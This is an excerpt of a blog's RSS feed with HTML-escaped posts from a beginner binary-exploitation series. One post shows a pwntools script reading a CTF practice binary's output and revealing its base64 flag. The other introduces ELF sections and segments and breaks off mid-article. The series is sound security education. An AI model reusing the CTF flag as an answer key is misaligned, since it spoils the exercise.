+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tell you a secret (only smart baby can see it) :
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Maybe I will tell you again when you clever than ELSEpush ......
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The program says: &lt;strong&gt;Pwntools&lt;/strong&gt; is a great python module and wants to tell us a secret that only smart people can see&lt;/p&gt;
+&lt;p&gt;So how can we see this so-called secret? Running it directly won&amp;rsquo;t show it ()&lt;/p&gt;
+&lt;p&gt;Based on what we learned and &lt;strong&gt;the program&amp;rsquo;s output&lt;/strong&gt;, we can deduce that we should use pwntools to view it&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt;                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Python&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.9.9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Jan&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GCC&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;11.2.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;more&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;information&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since the program has no input, only output, we have to use recv() or recvline() functions, qaq&lt;/p&gt;
+&lt;p&gt;EXP:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The whole process:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt;                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Python&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.9.9&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Jan&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GCC&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;11.2.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;more&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;information&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;108320&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;./tools&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stopped&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;108320&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pwntools is such an awesome python module, right?n&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Tell you a secret (only smart baby can see it) :n&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo=rMaybe I will tell you again when you clever than ELSEpush ......n&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwned.png&#34;
+	width=&#34;1138&#34;
+	height=&#34;673&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwned_hue1856b9b3afa3464f05aa1d3e572745d_582296_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;PWNed!&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;405px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;the-end-&#34;&gt;The END= =&lt;/h2&gt;
+&lt;p&gt;To Be Continued&amp;hellip;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Part of the translations by &lt;strong&gt;GPT-4&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>PWN! PWN! PANG! Part1---Basic Knowledge</title>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/</link>
+        <pubDate>Thu, 27 Jan 2022 21:24:46 -0500</pubDate>
+        
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part1---Basic Knowledge" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part1&#34;&gt;PWN! PWN! PANG! Part1&lt;/h1&gt;
+&lt;h2 id=&#34;foreword&#34;&gt;Foreword&lt;/h2&gt;
+&lt;p&gt;Here are the PGR&amp;rsquo;s basic PWN learning notes, mainly studying the exploitation of vulnerabilities in ELF executable files under Linux&lt;/p&gt;
+&lt;p&gt;The content involves:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Stack vulnerability exploitation, mainly stack overflow attacks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;PS: Speaking of Stack Overflow, we must mention a famous IT forum of the same name abroad (it&amp;rsquo;s &lt;strong&gt;extremely, extremely, extremely&lt;/strong&gt; useful)&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;Important things must be said three times XD&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://stackoverflow.com/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Format String vulnerabilities in the C language Printf() function&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;A little bit of heap exploitation&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;what-is-pwn&#34;&gt;What is PWN?&lt;/h2&gt;
+&lt;p&gt;PWN originally meant the &amp;ldquo;bang&amp;rdquo; sound when a hacker broke into a system. Here, we interpret it as &lt;strong&gt;binary vulnerability mining and exploitation&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;To explain step by step = = It can be summarized as the following points:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Crack and exploit successfully (binary vulnerabilities of the program)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Break into (devices, servers)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Control (devices, servers)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/pwn.jpg&#34;
+	width=&#34;316&#34;
+	height=&#34;206&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This is how &amp;ldquo;pwn&amp;rdquo; looks like&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;368px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;elf-files-under-linux&#34;&gt;ELF Files Under Linux&lt;/h2&gt;
+&lt;p&gt;ELF files are executable files under Linux, they&amp;rsquo;re different from exe files under Windows&lt;/p&gt;
+&lt;p&gt;You can use the File command to check your file format:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file.png&#34;
+	width=&#34;1139&#34;
+	height=&#34;654&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;File Command&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;174&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;However, there is an interesting point here. Since the File command judges the file type based on the file header, the file suffix does not affect its judgment of the file as an ELF file (even if a.out has been changed to a.zip)&lt;/p&gt;
+&lt;p&gt;However, if you double-click this .zip in the folder window, you will find that: this ELF file has been opened as a compressed file (this seems very similar to Windows)&lt;/p&gt;
+&lt;p&gt;It can be seen that in the process of changing the suffix, it has interfered with the system&amp;rsquo;s recognition of the file opening method = =&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file1.png&#34;
+	width=&#34;945&#34;
+	height=&#34;627&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file1_hu875359da3f79d0c44f12bd1a55586189_97232_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/file1_hu875359da3f79d0c44f12bd1a55586189_97232_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;a &amp;ldquo;zipped&amp;rdquo; program&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;150&#34;
+		data-flex-basis=&#34;361px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;structure-of-elf-files&#34;&gt;Structure of ELF Files&lt;/h2&gt;
+&lt;p&gt;Seems we went off-topic =   =&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF.jpg&#34;
+	width=&#34;1363&#34;
+	height=&#34;716&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ELF File Structure&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;190&#34;
+		data-flex-basis=&#34;456px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s take another look at this executable file &amp;ldquo;a.out&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;We just accidentally opened it as a compressed file (as shown above)&lt;/p&gt;
+&lt;p&gt;We see a bunch of strange files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;.got&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;.got.plt&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;.plt&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;.text&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;hellip;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These files actually represent the various &lt;strong&gt;&amp;ldquo;sections&amp;rdquo;&lt;/strong&gt; of this ELF file on the disk&lt;/p&gt;
+&lt;p&gt;And when the ELF is mapped into memory, there are &lt;strong&gt;&amp;ldquo;segments&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF1.jpg&#34;
+	width=&#34;1351&#34;
+	height=&#34;703&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Sections and Segments&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;461px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;segments-and-sections&#34;&gt;Segments and Sections&lt;/h2&gt;
+&lt;p&gt;Here, let&amp;rsquo;s talk in detail about segments and sections&lt;/p&gt;
+&lt;p&gt;(Well =    =, because I personally feel this knowledge has a big impact on later learning)&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s an important diagram:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img.png&#34;
+	width=&#34;1359&#34;
+	height=&#34;717&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img_hu25854d26341c86fdce4489a656418346_70073_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img_hu25854d26341c86fdce4489a656418346_70073_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Diagram&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;454px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From this diagram, we can see that the .data, .bss, and .got.plt sections are all mapped to the &lt;strong&gt;Data Segment&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;While .rodata, .text, .init, ELF Header are mapped to the &lt;strong&gt;Code Segment&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Why?&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The first three sections &lt;del&gt;(too lazy to write in detail)&lt;/del&gt; have a common feature: readable and writable. Because user data is saved here, it obviously can&amp;rsquo;t be non-writable =  = . Obviously, you also can&amp;rsquo;t let it be executable, otherwise users can write any data and execute it (never trust user input is safe)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The latter four sections are code parts, which are often little programs of their own, so they are readable and executable, but not writable =   =&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Lastly, &amp;gt;__&amp;lt;, here&amp;rsquo;s another diagram;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img1.png&#34;
+	width=&#34;1350&#34;
+	height=&#34;719&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img1_huc654210b42dc0202bb596523623c9d4c_100907_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/img1_huc654210b42dc0202bb596523623c9d4c_100907_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Functions of Some Sections&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;450px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;organization-of-program-data-in-memory&#34;&gt;Organization of Program Data in Memory&lt;/h2&gt;
+&lt;p&gt;Straight to the diagram()&lt;/p&gt;
